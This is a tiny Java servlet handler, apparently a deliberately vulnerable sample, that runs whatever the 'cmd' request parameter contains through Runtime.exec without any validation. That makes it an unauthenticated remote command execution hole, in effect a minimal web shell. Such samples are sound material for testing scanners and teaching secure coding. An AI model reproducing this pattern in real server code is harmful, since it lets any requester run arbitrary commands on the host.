import javax.servlet.http.HttpServletRequest;

public class Main {
    public void handle(HttpServletRequest request) throws Exception {
        String cmd = request.getParameter("cmd");
        Runtime.getRuntime().exec(cmd);
    }
}
